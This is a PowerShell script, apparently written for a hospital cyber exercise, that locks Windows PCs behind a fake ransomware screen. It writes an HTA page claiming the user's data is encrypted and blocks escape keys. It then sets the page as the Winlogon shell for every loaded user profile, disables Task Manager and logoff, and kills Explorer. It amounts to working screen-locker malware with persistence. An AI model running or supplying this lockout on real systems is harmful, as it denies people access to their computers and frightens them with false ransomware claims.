# LOCKOUT_PC.ps1 - Cyber Exercise Lockout (Windows 10 Compatible)

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Must run as Administrator" -ForegroundColor Red
    exit 1
}

$ExerciseDir = "C:\CyberExercise"
$HtaPath = "C:\CyberExercise\lockscreen.hta"

if (!(Test-Path $ExerciseDir)) {
    New-Item -ItemType Directory -Path $ExerciseDir -Force | Out-Null
}

# STEP 1: Create HTA file
$h = ""
$h += "<html><head><title>HACKED</title>"
$h += "<HTA:APPLICATION ID=L APPLICATIONNAME=L BORDER=none BORDERSTYLE=none CAPTION=no "
$h += "CONTEXTMENU=no INNERBORDER=no MAXIMIZEBUTTON=no MINIMIZEBUTTON=no NAVIGABLE=no "
$h += "SCROLL=no SELECTION=no SHOWINTASKBAR=no SINGLEINSTANCE=yes SYSMENU=no WINDOWSTATE=maximize />"
$h += "<style>"
$h += "* { margin:0; padding:0; }"
$h += "body { background:#0a0a0a; color:#ff0000; font-family:Courier New,monospace; "
$h += "display:flex; flex-direction:column; align-items:center; justify-content:center; "
$h += "height:100vh; overflow:hidden; cursor:none; }"
$h += ".skull { font-size:80px; margin-bottom:20px; }"
$h += "h1 { font-size:64px; text-transform:uppercase; letter-spacing:8px; "
$h += "text-shadow:0 0 20px #ff0000,0 0 40px #cc0000; margin-bottom:30px; }"
$h += ".sub { font-size:24px; color:#cc0000; letter-spacing:5px; margin-bottom:10px; }"
$h += ".info { font-size:16px; color:#555; margin-top:40px; }"
$h += "</style>"
$h += "<script language=VBScript>"
$h += "Sub document_onkeydown : Set ev=window.event"
$h += " : If ev.altKey And ev.keyCode=115 Then ev.returnValue=False"
$h += " : If ev.ctrlKey And ev.keyCode=87 Then ev.returnValue=False"
$h += " : If ev.ctrlKey And ev.keyCode=27 Then ev.returnValue=False"
$h += " : If ev.altKey And ev.keyCode=9 Then ev.returnValue=False"
$h += " : If ev.keyCode=122 Then ev.returnValue=False"
$h += " : End Sub"
$h += " Sub window_onload : window.moveTo 0,0 : window.resizeTo screen.width,screen.height"
$h += " : setInterval ""self.focus"",500 : End Sub"
$h += "</script></head>"
$h += "<body ondragstart=""return false"" onselectstart=""return false"" oncontextmenu=""return false"">"
$h += "<div class=skull>&#9760;</div>"
$h += "<h1>You Have Been Hacked</h1>"
$h += "<div class=sub>ALL YOUR SYSTEMS ARE COMPROMISED</div>"
$h += "<div class=sub>ALL YOUR DATA HAS BEEN ENCRYPTED</div>"
$h += "<div class=info>[ CYBER EXERCISE - HOSPICES CIVILS DE LYON ]</div>"
$h += "</body></html>"

Set-Content -Path $HtaPath -Value $h -Encoding ASCII
Write-Host "[+] HTA created" -ForegroundColor Yellow

# STEP 2: Modify all loaded user hives
$profiles = Get-ChildItem "Registry::HKEY_USERS" | Where-Object { $_.Name -match 'S-1-5-21-' -and $_.Name -notmatch '_Classes$' }

foreach ($p in $profiles) {
    $sid = $p.PSChildName
    $base = "Registry::HKEY_USERS\" + $sid

    $wl = $base + "\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
    if (!(Test-Path $wl)) { New-Item -Path $wl -Force | Out-Null }
    Set-ItemProperty -Path $wl -Name "Shell" -Value ("mshta.exe " + $HtaPath) -Type String

    $pol = $base + "\Software\Microsoft\Windows\CurrentVersion\Policies\System"
    if (!(Test-Path $pol)) { New-Item -Path $pol -Force | Out-Null }
    Set-ItemProperty -Path $pol -Name "DisableTaskMgr" -Value 1 -Type DWord

    $exp = $base + "\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    if (!(Test-Path $exp)) { New-Item -Path $exp -Force | Out-Null }
    Set-ItemProperty -Path $exp -Name "NoLogoff" -Value 1 -Type DWord
    Set-ItemProperty -Path $exp -Name "NoChangeStartMenu" -Value 1 -Type DWord

    Write-Host ("[+] User " + $sid + " locked") -ForegroundColor Yellow
}

# STEP 3: Kill Explorer and launch HTA
Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
Write-Host "[+] Explorer killed" -ForegroundColor Yellow

Start-Process "mshta.exe" -ArgumentList $HtaPath
Write-Host "[+] HTA launched" -ForegroundColor Yellow

Write-Host "[*] LOCKOUT COMPLETE" -ForegroundColor Red
